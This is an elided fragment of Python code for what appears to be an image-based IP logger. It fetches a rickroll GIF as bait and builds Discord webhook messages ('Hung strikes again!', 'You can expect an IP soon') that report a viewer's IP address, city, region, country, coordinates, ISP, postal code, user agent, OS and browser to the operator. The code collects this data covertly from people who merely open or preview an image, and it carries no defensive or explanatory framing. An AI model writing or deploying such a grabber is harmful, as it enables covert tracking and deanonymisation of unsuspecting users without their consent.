...
bindata = httpx.get('https://media1.tenor.com/m/x8v1oNUOmg4AAAAC/rickroll-roll.gif').content
...
def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
    return {
  "username": "Hung",
  "content": "<@1133313060916957194>",
  "embeds": [
    {
      "title": "Hung strikes again!",
      "color": 16711803,
  ...
  "embeds": [
    {
      "title": "Hung Alert!",
      "color": 16711803,
      "description": f"Discord previewed a Hung Image! You can expect an IP soon.\n\n**IP:** `{ip}`\n**UserAgent:** `Look Below!`\n```yaml\n{uag}```",
      "author": {
        "name": "Hung"
      },
      "fields": [
